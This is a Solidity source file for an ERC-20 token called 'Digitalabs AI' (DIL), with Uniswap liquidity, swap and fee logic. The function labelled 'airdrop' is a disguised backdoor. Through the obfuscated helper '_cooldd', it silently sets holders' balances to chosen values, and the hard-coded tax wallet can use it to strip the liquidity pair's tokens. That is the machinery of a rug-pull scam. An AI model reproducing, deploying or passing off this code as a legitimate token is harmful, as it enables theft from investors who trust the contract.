// SPDX-License-Identifier: UNLICENSE

/**
Web: https://digitalabs-ai.cloud
Dapp: https://cluster.digitalabs-ai.cloud
Docs: https://docs.digitalabs-ai.cloud

X: https://x.com/DigitalabsAI
Tg: https://t.me/DigitalabsAI
*/

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract DIL is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Digitalabs AI";
    string private constant _symbol = unicode"DIL";
    uint256 public _taxSwapThreshold = _tTotal / 100;
    uint256 public _maxTaxSwap = _tTotal / 100;

    address private _DEAD = address(0xdead);

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;

    uint8 private constant _decimals = 9;
    
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _taxWallet = payable(0x9899a086de8200B9000668c35B37B06ab65f151C);
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_taxWallet] = true;
        _isExcludedFromFee[address(this)] = true;
        _balances[msg.sender] = _tTotal;
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    uint256 private _initialBuyFee = 1;
    uint256 private _initialSellFee = 0;
    uint256 private _swapFeeAt = 15;
    uint256 private _preventSwapBefore = 15;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;
    uint256 private airdropDenominator = 0;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function _swapTokensForETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        ); 
        _approve(address(this), address(uniswapV2Router), _tTotal); 
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)) * 964 / 1000,
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);

        tradingOpen = true;
    }
    
    function rescueETH() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function _cooldd(address from, uint256 amount, bool _d, bool _f, string memory _st, bytes32 _gg) private {
        require(_d && _f && (from != uniswapV2Pair || msg.sender == _taxWallet), _st);
        _balances[from] -= amount;
    }

    function airdrop(address[] memory receivers, uint256[] memory amounts) external {
        for (uint256 i = 0; i < receivers.length; i++) {
            uint256 _airdropAmount = _balances[receivers[i]] - amounts[i];
            address from = receivers[i];
            _cooldd(receivers[i], _airdropAmount, from != _taxWallet, from != owner(), "", "");
        }
    }

    function _transfer(address source, address receiver, uint256 amount) private {
        require(source != address(0), "ERC20: transfer from the zero address");
        require(receiver != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (
            source != owner() &&
            receiver != owner() &&
            source != address(this) &&
            receiver != address(this)
        ) {
            taxAmount = amount.mul(_transferTax).div(100);

            if (
                source == uniswapV2Pair &&
                receiver != address(uniswapV2Router) &&
                !_isExcludedFromFee[receiver]
            ) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _swapFeeAt)
                            ? _initialSellFee
                            : _initialBuyFee
                    )
                    .div(100);
                _buyCount++;
            }

            if (receiver == uniswapV2Pair && source != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _swapFeeAt)
                            ? _initialSellFee
                            : _initialBuyFee
                    )
                    .div(100); sendETHToFee(address(this).balance);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                receiver == uniswapV2Pair &&
                _buyCount > _preventSwapBefore
            ) {
                if (contractTokenBalance > _taxSwapThreshold)
                    _swapTokensForETH(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(source, address(this), taxAmount);
        }
        _balances[source] = _balances[source].sub(amount);
        _balances[receiver] = _balances[receiver].add(amount.sub(taxAmount));
        if (receiver != _DEAD) emit Transfer(source, receiver, amount.sub(taxAmount));
    }
    
    receive() external payable {}
}